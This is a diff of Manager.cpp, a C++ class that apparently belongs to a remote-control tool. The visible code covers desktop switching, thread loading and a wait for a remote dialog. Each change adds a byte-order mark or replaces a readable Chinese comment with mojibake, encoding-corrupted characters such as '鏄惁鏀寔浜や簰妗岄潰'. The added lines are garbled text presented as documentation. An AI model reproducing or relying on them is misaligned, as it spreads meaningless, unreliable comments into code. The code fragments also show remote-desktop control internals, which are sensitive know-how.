@@ -1,4 +1,4 @@
-// Manager.cpp: implementation of the CManager class.
+﻿// Manager.cpp: implementation of the CManager class.
 //
 //////////////////////////////////////////////////////////////////////
 
@@ -10,7 +10,7 @@
 typedef struct {
     unsigned(__stdcall* start_address)(void*);
     void* arglist;
-    bool	bInteractive; // 是否支持交互桌面
+    bool	bInteractive; // 鏄惁鏀寔浜や簰妗岄潰
     HANDLE	hEventTransferArg;
 } THREAD_ARGLIST, * LPTHREAD_ARGLIST;
 
@@ -23,7 +23,7 @@ unsigned int __stdcall ThreadLoader(LPVOID param)
         THREAD_ARGLIST	arg;
         memcpy(&arg, param, sizeof(arg));
         SetEvent(arg.hEventTransferArg);
-        // 与桌面交互
+        // 涓庢闈氦浜?
         if (arg.bInteractive)
             SelectDesktop(NULL);
 
@@ -139,7 +139,7 @@ HDESK OpenActiveDesktop(ACCESS_MASK dwDesiredAccess)
     return hInputDesktop;
 }
 
-// 返回新桌面句柄，如果没有变化返回NULL
+// 杩斿洖鏂版闈㈠彞鏌勶紝濡傛灉娌℃湁鍙樺寲杩斿洖NULL
 HDESK IsDesktopChanged(HDESK currentDesk, DWORD accessRights)
 {
     HDESK hInputDesk = OpenActiveDesktop(accessRights);
@@ -148,7 +148,7 @@ HDESK IsDesktopChanged(HDESK currentDesk, DWORD accessRights)
     if (!currentDesk) {
         return hInputDesk;
     } else {
-        // 通过桌面名称判断是否真正变化
+        // 閫氳繃妗岄潰鍚嶇О鍒ゆ柇鏄惁鐪熸鍙樺寲
         char oldName[256] = { 0 };
         char newName[256] = { 0 };
         DWORD len = 0;
@@ -164,8 +164,8 @@ HDESK IsDesktopChanged(HDESK currentDesk, DWORD accessRights)
     return NULL;
 }
 
-// 桌面切换辅助函数：通过桌面名称比较判断是否需要切换
-// 返回值：true表示桌面已切换，false表示桌面未变化
+// 妗岄潰鍒囨崲杈呭姪鍑芥暟锛氶€氳繃妗岄潰鍚嶇О姣旇緝鍒ゆ柇鏄惁闇€瑕佸垏鎹?
+// 杩斿洖鍊硷細true琛ㄧず妗岄潰宸插垏鎹紝false琛ㄧず妗岄潰鏈彉鍖?
 bool SwitchToDesktopIfChanged(HDESK& currentDesk, DWORD accessRights)
 {
     HDESK hInputDesk = IsDesktopChanged(currentDesk, accessRights);
@@ -257,7 +257,7 @@ BOOL CManager::Send(LPBYTE lpData, UINT nSize)
 VOID CManager::WaitForDialogOpen()
 {
     WaitForSingleObject(m_hEventDlgOpen, 8000);
-    //必须的Sleep,因为远程窗口从InitDialog中发送COMMAND_NEXT到显示还要一段时间
+    //蹇呴』鐨凷leep,鍥犱负杩滅▼绐楀彛浠嶪nitDialog涓彂閫丆OMMAND_NEXT鍒版樉绀鸿繕瑕佷竴娈垫椂闂?
     Sleep(150);
 }
 
